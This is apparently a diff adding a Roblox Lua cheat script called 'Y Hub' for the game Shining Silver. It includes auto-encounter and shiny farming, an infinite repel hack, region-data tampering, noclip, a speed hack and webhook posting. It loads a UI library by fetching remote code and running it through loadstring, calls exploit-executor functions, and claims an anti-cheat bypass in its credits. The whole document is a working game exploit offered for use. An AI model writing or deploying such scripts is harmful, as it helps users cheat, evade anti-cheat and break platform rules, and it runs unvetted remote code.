+    elseif not (_p.RegionData.currentChunk and _p.RegionData.currentChunk.regionData and _p.RegionData.currentChunk.regionData.Grass) and FishingMode == false then
+      LabelAutoFinderStatus:UpdateLabel("Error creating encounter: Invalid Grass", true)
+      return
+    elseif FishingMode == true and (_p.RegionData.currentChunk.regionData and _p.RegionData.currentChunk.regionData[Rod]) then
+       self.FishingWater = _p.RegionData.currentChunk.regionData[Rod]
+    end
+
+
+    if self.Restarting == false and os.clock() - self.LastCall > AutoFinderDelay and (self.Grass or self.FishingWater) and not self.CurrentBattle and self.CallingBattle == false then
+    
+    self.CallingBattle = true
+    self.LastCall = os.clock()
+    self:CreateEncounter()
+    self.BattleCalled = true
+
+    end
+
+    if self.BattleCalled == true then 
+       if self.CurrentBattle and (self.CurrentBattle and self.CurrentBattle.actionQueue and self.CurrentBattle.actionQueue[7]) then
+        self.TotalEncounters = self.TotalEncounters+1
+        LabelAutoFinderStatus:UpdateLabel("Status: Encounter successfully created! <"..self.TotalEncounters..">", true)
+        self.BattleCalled = false
+        self.PokemonData = self:GetPokemonData()
+        self:UpdatePokemonInfos()
+        self:UpdateLabels()
+        
+
+        LabelEncounters:UpdateLabel("Total Encounters: "..self.TotalEncounters, true)
+        if self:CanGetPokemon() then
+            LabelAutoFinderStatus:UpdateLabel("Status: Waiting for player-action!", true)
+            if self.isShiny then
+printconsole("IS SHINY")
+                self.ShinyEncounters = self.ShinyEncounters+1
+                LabelShinyEncounters:UpdateLabel("Shiny Encounters: "..self.ShinyEncounters, true)
+            end
+                _p.Menu:disable()
+                _p.PlayerList:disable() 
+                self:WaitForPlayer()
+            else     
+                self.CurrentBattle:destroy()
+                self.BattleCalled = false
+                self.CallingBattle = false
+                self.CurrentBattle = nil
+               
+            end
+
+       elseif not self.CurrentBattle then --Battle:new() --> Possible error
+        self.BattleCalled = false
+        LabelAutoFinderStatus:UpdateLabel("Status: Error detected (Delay value too low?) <Restarting>", true)
+        
+        self.Restarting = true
+        task.wait(3.3) --Bad and lazy ideia
+        self.Restarting = false
+        self.CallingBattle = false
+
+ 
+       end
+    end
+
+end)
+end
+
+function AutoFinder:Stop()
+ 
+    if self.AutoFinderConnection then self.AutoFinderConnection:Disconnect() end 
+ 
+end
+ 
+function AutoFinder:CleanUpBattle()
+ 
+ _p.Battle.currentBattle = nil
+ 
+self.CurrentBattle:destroy() -- R.I.P.
+ 
+Camera.FieldOfView = 70
+Camera.CameraType = Enum.CameraType.Custom
+ 
+self.LastCall = os.clock() --Restart autofarm with a delay
+ 
+self.BattleCalled = false
+self.CallingBattle = false
+self.CurrentBattle = nil
+
+_p.Menu:enable()
+if _p.PlayerList.enabled then _p.PlayerList:enable() end
+                
+end
+
+function AutoFinder:CheckRegionData(Encounter)
+if not ChunkEncountersIds[Encounter] then return end
+if _p.RegionData.currentChunk.id ~= ChunkEncountersIds[Encounter].ChunkId and ChunkEncountersIds[Encounter].ChunkId ~= "Any" then return end
+
+    for Index,Region in pairs(_p.RegionData.currentChunk.regionData) do
+        if ChunkEncountersIds[Encounter].RealName == Index and _p.RegionData.currentChunk.regionData.Grass then
+       
+            if self.LastGrassRoute ~= _p.RegionData.currentChunk.id and self.LastGrassRoute ~= nil then --if new chunk
+                self.OldGrass = nil
+                self.NewGrass = nil
+            end
+        
+            if Encounter == "Grass" and self.OldGrass then
+                 _p.RegionData.currentChunk.regionData.Grass.id = self.OldGrass
+            end
+            
+            self.OldGrass =  _p.RegionData.currentChunk.regionData.Grass.id
+            self.NewGrass = Region.id
+            self.LastGrassRoute = _p.RegionData.currentChunk.id
+           
+            _p.RegionData.currentChunk.regionData.Grass.id = Region.id
+        
+            break
+        end
+    end
+    
+end
+ 
+function AutoFinder:SendRequest()
+ 
+    NewData = game:GetService("HttpService"):JSONEncode(ReportData)
+ 
+    ExploitRequest = http_request or request or HttpPost or syn.request
+    FinalData = {Url = Weebhook, Body = NewData, Method = "POST", Headers = {["content-type"] = "application/json"}}
+ 
+    ExploitRequest(FinalData)
+ 
+end
+ 
+--Metamethod call __AutoFinder
+LPH_JIT_MAX(function()
+__AutoFinder = AutoFinder.new()
+ end)()
+
+--Noclip loop
+game:GetService("RunService").Stepped:Connect(function()
+    if getgenv().NoClip == true then
+        for Index,Part in pairs(PlayerParts) do
+            Part.CanCollide = false
+        end
+    end
+end)
+ 
+game:GetService("RunService").Heartbeat:Connect(function()
+   
+    if InfRepel and _p.RegionData.currentChunk.regionData and not AutoFinderStatus then 
+        
+        if _p.RegionData.currentChunk.regionData.GrassEncounterChance ~= -1 then
+            __AutoFinder.OldEncounterChance = _p.RegionData.currentChunk.regionData.GrassEncounterChance
+        end
+        _p.RegionData.currentChunk.regionData.GrassEncounterChance = -1
+    end
+end)
+
+--AUTO FINDER
+
+local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/VisualRoblox/Roblox/main/UI-Libraries/Visual%20UI%20Library/Source.lua'))()
+ 
+local Window = Library:CreateWindow('Y Hub', "Shining Silver (PSS)", 'Loading | Y Hub', 'rbxassetid://402778663', false, 'VisualUIConfigs', 'Purple')
+ 
+local Tab = Window:CreateTab('Auto Finder', true, 'rbxassetid://3926305904', Vector2.new(524, 44), Vector2.new(36, 36))
+ 
+local AutoFinderSection = Tab:CreateSection('Auto Finder [Beta] !Do not use after game updates!')
+
+
+ 
+local Toggle = AutoFinderSection:CreateToggle('Enable Auto Finder', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
+ 
+ 
+    AutoFinderStatus = Value
+    task.wait(0.5)
+    if Value == true then 
+        
+        Player:Move(Vector3.new(),true, true)
+        _p.MasterControl.WalkEnabled = false
+        __AutoFinder:Start()
+        
+    elseif Value == false then
+        
+         _p.MasterControl.WalkEnabled = true
+        __AutoFinder:Stop()
+        __AutoFinder:CleanUpBattle()
+       
+       LabelAutoFinderStatus:UpdateLabel("Status: __Disabled", true)
+        
+    end
+end)
+ 
+local Toggle = AutoFinderSection:CreateToggle('Get Variations', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
+    GetVariations = Value
+end)
+
+
+ local AutoFinderDelayTextbox;AutoFinderDelayTextBox = AutoFinderSection:CreateTextbox('Auto Finder Delay', '2.68', function(Value)
+    if typeof(tonumber(Value)) ~= "number" then return end
+    
+    if tonumber(Value) < 1 then
+        
+        Library:CreatePrompt('TwoButton', 'Y-HUB - Security_Check', 'For your safety, values lower than "1" are not recommended, you can still use them but at your own risk!', {
+        'Confirm',
+        function()
+            AutoFinderDelay = tonumber(Value)
+        end,
+        'Cancel',
+        function()
+          return
+        end
+    })
+    
+    return
+    end			
+    
+    AutoFinderDelay = tonumber(Value)
+end)
+
+local FishingSection = Tab:CreateSection('Auto Fish')
+
+
+local Toggle = FishingSection:CreateToggle('Fishing Mode (Water needed)', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
+    FishingMode = Value
+end)
+ 
+local Dropdown = FishingSection:CreateDropdown('Fishing Rod', {'Old Rod', 'Good Rod'}, 'Good Rod', 0.25, function(Value)
+    Rod = Value == "Old Rod" and "OldRod" or Value == "Good Rod" and "GoodRod"
+end)
+ 
+local ShinySection = Tab:CreateSection('Shiny Encounters')
+
+
+local Toggle = ShinySection:CreateToggle('Get Shiny', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
+    GetShiny = Value
+end)
+ 
+local Dropdown = ShinySection:CreateDropdown('Shiny Mode', {'Any Shiny', 'WishListed Shiny'}, 'Any Shiny', 0.25, function(Value)
+    ShinyMode = Value
+end)
+
+
+local InfoSection = Tab:CreateSection('Encounter Info')
+
+ LabelAutoFinderStatus= InfoSection:CreateLabel('Auto Finder Status: N/A')
+ LabelPokemonName = InfoSection:CreateLabel('Last Found: N/A')
+ LabelPokemonVariation = InfoSection:CreateLabel('Variation: N/A')
+ LabelPokemonisShiny = InfoSection:CreateLabel('is Shiny: N/A')
+ LabelPokemonCaptureRate = InfoSection:CreateLabel('Capture Rate: N/A')
+ LabelPokemonHiddenAbility = InfoSection:CreateLabel('Ability: N/A')
+ LabelEncounters = InfoSection:CreateLabel('Total Encounters: N/A')
+ LabelShinyEncounters = InfoSection:CreateLabel('Total Shiny Encounters: N/A')
+ 
+ 
+ --MISC
+local MiscTab = Window:CreateTab('Misc', true, 'rbxassetid://3926305904', Vector2.new(524, 44), Vector2.new(36, 36))
+ 
+local MiscSection = MiscTab:CreateSection('Misc')
+ --[[
+local Toggle = Section:CreateToggle('Loterry Rollback', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
+   getgenv().LoterryRollback = Value
+end)
+]]
+
+local Dropdown = MiscSection:CreateDropdown('Encounters-Region (Route Needed)', {'Grass','Candles','Flowers'}, 'Grass', 0.25, function(Value)
+    __AutoFinder:CheckRegionData(Value)
+end)
+
+local Toggle = MiscSection:CreateToggle('Inf Repel', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
+    if Value == true then
+        __AutoFinder.OldEncounterChance = _p.RegionData.currentChunk.regionData.GrassEncounterChance 
+        InfRepel = true
+    elseif Value == false then
+        InfRepel = false
+        _p.RegionData.currentChunk.regionData.GrassEncounterChance = __AutoFinder.OldEncounterChance
+    end
+end)
+ 
+local Button = MiscSection:CreateButton('Heal Pokemons', function()
+    _p.Events:get('PDS', 'getPartyPokeBalls')
+end)
+ 
+ 
+local WebhookSection = MiscTab:CreateSection('Webhooks')
+
+local Toggle = WebhookSection:CreateToggle('Webhook-Notify', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
+    WebHookNotify = Value
+end)
+ 
+ 
+local Button = WebhookSection:CreateButton('Send test Webhook-Notify', function()
+    __AutoFinder:SendRequest()
+end)
+ 
+ --LOCALPLAYER TAB
+ local PlayerTab = Window:CreateTab('Player', true, 'rbxassetid://3926305904', Vector2.new(524, 44), Vector2.new(36, 36))
+ 
+ local Section = PlayerTab:CreateSection('Player Features')
+ 
+ local WalkSpeedSlider = Section:CreateSlider('Speed Hack', 1, 75, 16, Color3.fromRGB(0, 125, 255), function(Value)
+     game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = Value
+ end)
+ 
+local Toggle = Section:CreateToggle('Noclip', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
+    getgenv().NoClip = Value
+end)
+ 
+ 
+ 
+--CREDITS
+local Tab = Window:CreateTab('Credits', true, 'rbxassetid://3926305904', Vector2.new(524, 44), Vector2.new(36, 36))
+ 
+local Section = Tab:CreateSection('Credits')
+ 
+local Label1 = Section:CreateLabel('Features by yLord#0023 & Erste')
+local Label2 = Section:CreateLabel('Anti Cheat bypass by yLord#0023')
+local Label3 = Section:CreateLabel('UI Library by cal7')
+ 
+ 
+--CONFIG
+local LibraryFunctions = Window:CreateTab('UI Config', false, 'rbxassetid://3926305904', Vector2.new(524, 44), Vector2.new(36, 36))
+ 
+local UIFunctions = LibraryFunctions:CreateSection('UI Functions')
+ 
+local ForceEnable = UIFunctions:CreateButton('Force enable game UI', function()
+    _p.Menu:enable()
+end)
+ 
+local ToggleKeybind = UIFunctions:CreateKeybind('Toggle UI', 'E', function()
+    Library:ToggleUI()
+end)
+ 
+local TextboxKeybind = UIFunctions:CreateTextbox('Notification', 'Text', function(Value)
+    Library:CreateNotification('Notification', Value, 5)
+end)
+ 
+local TransparencySlider = UIFunctions:CreateSlider('Transparency', 0, 100, 0, Color3.fromRGB(0, 125, 255), function(Value)
+    Library:SetTransparency(Value / 100, true)
+end)
+ 
+local TextPromptButton = UIFunctions:CreateButton('Create Text Prompt', function()
+    Library:CreatePrompt('Text', 'Prompt Title', 'Prompt Text', 'Alright')
+end)
+ 
+local OneButtonPromptButton = UIFunctions:CreateButton('Create One Button Prompt', function()
+    Library:CreatePrompt('OneButton', 'Prompt Title', 'Prompt Text', {
+        'Alright',
+        function()
+ 
+        end
+    })
+end)
+ 
+local TwoButtonPromptButton = UIFunctions:CreateButton('Create Two Button Prompt', function()
+    Library:CreatePrompt('TwoButton', 'Prompt Title', 'Prompt Text', {
+        'Button 1',
+        function()
+ 
+        end,
+        'Button 2',
+        function()
+ 
+        end
+    })
+end)
+ 
+local ConfigSection = LibraryFunctions:CreateSection('Config')
+ 
+local ConfigNameString = ''
+local ConfigName = ConfigSection:CreateTextbox('Config Name', 'Input', function(Value)
+    ConfigNameString = Value
+end)
+ 
+local SaveConfigButton = ConfigSection:CreateButton('Save Config', function()
+    Library:SaveConfig(ConfigNameString)
+end)
+ 
+local SelectedConfig = ''
+local ConfigsDropdown = ConfigSection:CreateDropdown('Configs', Library:GetConfigs(), nil, 0.25, function(Value)
+    SelectedConfig = Value
+end)
+ 
+local DeleteConfigButton = ConfigSection:CreateButton('Delete Config', function()
+    Library:DeleteConfig(SelectedConfig)
+end)
+ 
+local LoadConfigButton = ConfigSection:CreateButton('Load Config', function()
+    Library:LoadConfig(SelectedConfig)
+end)
+ 
+local RefreshConfigsButton = ConfigSection:CreateButton('Refresh', function()
+    ConfigsDropdown:UpdateDropdown(Library:GetConfigs())
+end)
+ 
+local ThemesSection = LibraryFunctions:CreateSection('Themes')
+ 
+local ThemesDropdown = ThemesSection:CreateDropdown('Themes', Library:GetThemes(), nil, 0.25, function(Value)
+    Library:ChangeTheme(Value)
+end)
+ 
+local ColorSection = LibraryFunctions:CreateSection('Custom Colors')
+ 
+for Index, CurrentColor in next, Library:ReturnTheme() do
+    ColorSection:CreateColorpicker(Index, CurrentColor, 0.25, function(Color)
+        Library:ChangeColor(Index, Color)
+    end, {true})
+end
+end)
